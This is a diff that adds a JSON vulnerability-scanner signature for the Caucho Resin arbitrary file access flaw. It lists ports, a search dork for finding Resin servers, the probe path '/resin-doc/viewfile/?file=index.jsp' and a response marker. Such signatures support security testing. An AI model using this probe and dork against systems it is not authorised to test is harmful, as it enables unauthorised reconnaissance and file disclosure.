@@ -1,0 +1,19 @@
+{
+    "name": "Caucho_Resin_Arbitrary_File_Access",
+    "method": "GET",
+    "port": [
+        80,
+        8080,
+        8888
+    ],
+    "dork": "apps=Resin",
+    "suffix": [
+        "/resin-doc/viewfile/?file=index.jsp"
+    ],
+    "hits": [
+        "caucho.server"
+    ],
+    "references": [
+        "https://www.securityfocus.com/archive/1/434145"
+    ]
+}
